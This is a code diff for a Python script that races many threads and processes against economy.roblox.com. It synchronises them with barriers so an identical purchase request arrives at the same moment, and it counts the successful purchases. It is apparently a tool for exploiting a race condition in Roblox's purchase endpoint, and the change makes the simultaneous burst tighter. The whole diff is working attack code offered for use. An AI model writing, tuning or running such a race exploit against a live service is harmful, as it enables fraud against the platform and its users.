@@ -15,63 +15,76 @@ elif sys.platform == "win32":
 else:
     exit(f"'{sys.platform}' is not a supported platform")
 
-if __name__ == "__main__":
-    CPUS = multiprocessing.cpu_count()
-    PROCESSES_PER_CPU = 1
-    THREADS_PER_PROCESS = 100
-    START_DELAY = 10
+CPUS = multiprocessing.cpu_count()
+PROCESSES_PER_CPU = 1
+THREADS_PER_PROCESS = 100
+RETRY = False
 
-def thread_func(start_ts, request):
+def thread_func(t_barrier, t_ready, p_ready, request):
     global loc_success_count
     global loc_total_count
 
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(start_ts-time.time())
-        sock.connect(("economy.roblox.com", 443))
-        sock = ssl.create_default_context().wrap_socket(
-            sock, server_hostname="economy.roblox.com")
-        
-        delay = start_ts-time.time()
-        if 0 > delay:
-            return
-            
-        time.sleep(delay)
-        sock.send(request)
-
-        if b'{"purchased":true' in sock.recv(1024**2):
-            loc_success_count += 1
-        loc_total_count += 1
-    except:
-        pass
-    finally:
+    while True:
         try:
-            sock.close(socket.SHUT_RDWR)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect(("economy.roblox.com", 443))
+            sock = ssl.create_default_context().wrap_socket(
+                sock, server_hostname="economy.roblox.com")
+            break
         except:
-            pass
-        sock.close()
+            if RETRY:
+                try:
+                    sock.shutdown(socket.SHUT_RDWR)
+                except:
+                    pass
+                sock.close()
+            else:
+                sock = None
+                break
+            
+    if t_barrier.wait() == 0:
+        t_ready.set()
+    if not sock and not RETRY:
+        return
+    p_ready.wait()
     
-def worker_func(cpu_num, thread_count, success_count, total_count, lock,
-                *thread_args):
-    set_affinity(cpu_num)
+    sock.send(request)
+    loc_total_count += 1
+    if b'{"purchased":true' in sock.recv(1024**2):
+        loc_success_count += 1
     
+def worker_func(cpu_num, p_barrier, success_count, total_count,
+                lock, *thread_args):
     global loc_success_count
     global loc_total_count
+
+    set_affinity(cpu_num)
+
+    t_barrier = threading.Barrier(THREADS_PER_PROCESS)
+    t_ready = threading.Event()
+    p_ready = threading.Event()
     loc_success_count = 0
     loc_total_count = 0
 
     threads = [
         threading.Thread(
             target=thread_func,
-            args=(*thread_args,)
+            args=(t_barrier, t_ready, p_ready, *thread_args)
         )
-        for _ in range(thread_count)
+        for _ in range(THREADS_PER_PROCESS)
     ]
-
-    for thread in threads:
-        thread.start()
-    for thread in threads:
-        thread.join()
+    for t in threads:
+        t.start()
+    # wait until threads are initialized
+    t_ready.wait()
+    # wait until other processes are initialized
+    p_barrier.wait()
+    # signal threads to run
+    p_ready.set()
+    # wait until threads are done
+    for t in threads:
+        t.join()
 
     with lock:
         success_count.value += loc_success_count
@@ -133,20 +146,19 @@ if __name__ == "__main__":
     
     # start workers
     manager = multiprocessing.Manager()
+    p_barrier = multiprocessing.Barrier(CPUS * PROCESSES_PER_CPU)
     lock = manager.Lock()
     total_count = manager.Value("i", 0)
     success_count = manager.Value("i", 0)
-    start_ts = time.time() + START_DELAY
     workers = [
         multiprocessing.Process(
             target=worker_func,
             args=(
                 cpu_num,
-                THREADS_PER_PROCESS,
+                p_barrier,
                 success_count,
                 total_count,
                 lock,
-                start_ts,
                 request
             )
         )
